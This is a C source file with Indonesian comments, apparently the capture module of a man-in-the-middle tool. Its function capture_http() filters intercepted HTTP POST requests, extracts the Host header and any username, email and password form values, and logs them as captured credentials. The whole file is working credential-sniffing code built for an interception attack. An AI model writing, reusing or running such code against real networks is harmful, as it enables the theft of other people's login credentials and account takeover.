// ============================================================================
// IMPLEMENTASI: mitm/capture.c — Ekstraktor Akun Login Plaintext
// ============================================================================
#include "capture.h"
#include "../utils/logger.h"
#include <string.h>

int capture_init(void) { return 0; }
void capture_cleanup(void) {}

/*
 * === FUNGSI: capture_http() ===
 * Tujuan   : Menyaring formulir login POST dan mencatat username & password
 * Catatan  : Mematuhi Fix #11 (Ekstraksi Host Header yang aman)
 */
int capture_http(const uint8_t *data, int len) {
    if (len < 10) return -1;
    const char *p = (const char*)data;

    // Periksa apakah ini permintaan HTTP POST
    if (strncmp(p, "POST ", 5) != 0) return -1;

    // FIX #11: Ekstrak nama domain dari header Host:
    char host[MAX_HOSTNAME_LEN] = "unknown";
    const char *h = strstr(p, "Host: ");
    if (h) {
        h += 6;
        int hi = 0;
        while (*h && *h != '\r' && *h != '\n' && hi < MAX_HOSTNAME_LEN - 1) {
            host[hi++] = *h++;
        }
        host[hi] = '\0';
    }

    // Cari awal body data POST (setelah double CRLF \r\n\r\n)
    const char *body = strstr(p, "\r\n\r\n");
    if (!body) return -1;
    body += 4;

    // Cari kata kunci sensitif
    credential_t cred = {0};
    strncpy(cred.host, host, sizeof(cred.host) - 1);
    cred.timestamp = time(NULL);

    const char *u = strstr(body, "user");
    if (!u) u = strstr(body, "email");
    if (u) {
        const char *eq = strchr(u, '=');
        if (eq) {
            eq++;
            int i = 0;
            while (*eq && *eq != '&' && *eq != ' ' && i < 127) cred.username[i++] = *eq++;
            cred.username[i] = '\0';
        }
    }

    const char *pwd = strstr(body, "pass");
    if (pwd) {
        const char *eq = strchr(pwd, '=');
        if (eq) {
            eq++;
            int i = 0;
            while (*eq && *eq != '&' && *eq != ' ' && i < 127) cred.password[i++] = *eq++;
            cred.password[i] = '\0';
        }
    }

    // Jika berhasil menemukan kredensial, catat sebagai ALERT keamanan!
    if (strlen(cred.username) > 0 || strlen(cred.password) > 0) {
        log_credential(&cred);
        return 0;
    }
    return -1;
}
